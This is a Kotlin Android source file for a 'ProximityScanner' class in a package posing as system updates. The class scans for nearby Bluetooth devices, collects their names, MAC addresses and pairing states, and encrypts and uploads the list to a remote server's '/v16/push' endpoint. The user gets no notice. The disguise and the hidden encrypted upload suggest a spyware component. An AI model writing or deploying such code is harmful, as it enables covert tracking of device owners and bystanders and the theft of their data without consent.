package com.system.updates.modules.network

import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import com.system.updates.core.NetworkUtils
import com.system.updates.core.CryptoManager
import org.json.JSONArray
import org.json.JSONObject

class ProximityScanner(private val context: Context) {
    private val tag = "ProximityScanner"
    private val bluetoothAdapter: BluetoothAdapter? = BluetoothAdapter.getDefaultAdapter()
    private var isScanning = false
    private var scanReceiver: BroadcastReceiver? = null
    private val foundDevices = JSONArray()
    private val crypto = CryptoManager(context)
    private val network = NetworkUtils(context)

    fun scanForNearbyDevices(durationSeconds: Int = 10) {
        if (!hasPermissions()) {
            Log.e(tag, "Missing Bluetooth permissions")
            return
        }
        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            Log.e(tag, "Bluetooth not available or disabled")
            return
        }
        if (isScanning) return
        isScanning = true
        foundDevices.clear()

        scanReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                if (intent.action == BluetoothDevice.ACTION_FOUND) {
                    val device: BluetoothDevice? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
                    } else {
                        @Suppress("DEPRECATION")
                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                    }
                    device?.let {
                        val name = it.name ?: "Unknown"
                        val address = it.address
                        val bondState = it.bondState
                        val deviceJson = JSONObject().apply {
                            put("name", name)
                            put("address", address)
                            put("bondState", bondState)
                            put("type", "bluetooth")
                        }
                        foundDevices.put(deviceJson)
                        Log.d(tag, "Found: $name [$address]")
                    }
                }
            }
        }
        context.registerReceiver(scanReceiver, IntentFilter(BluetoothDevice.ACTION_FOUND))
        bluetoothAdapter.startDiscovery()

        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            stopScan()
        }, durationSeconds * 1000L)
    }

    fun stopScan() {
        if (!isScanning) return
        isScanning = false
        bluetoothAdapter?.cancelDiscovery()
        scanReceiver?.let {
            context.unregisterReceiver(it)
            scanReceiver = null
        }
        if (foundDevices.length() > 0) {
            sendDevicesToServer()
        }
    }

    private fun sendDevicesToServer() {
        val data = JSONObject().apply {
            put("type", "proximity_scan")
            put("devices", foundDevices)
            put("timestamp", System.currentTimeMillis())
        }
        val key = crypto.deriveDeviceKey()
        val encrypted = crypto.encryptData(data.toString().toByteArray(), aad = "scan".toByteArray())
        val b64 = android.util.Base64.encodeToString(encrypted, android.util.Base64.NO_WRAP)
        network.httpPost(network.getBaseUrl() + "/v16/push", "payload=$b64")
    }

    private fun hasPermissions(): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            return ContextCompat.checkSelfPermission(context, Manifest.permission.BLUETOOTH_SCAN) == PackageManager.PERMISSION_GRANTED
        } else {
            return ContextCompat.checkSelfPermission(context, Manifest.permission.BLUETOOTH) == PackageManager.PERMISSION_GRANTED
        }
    }
}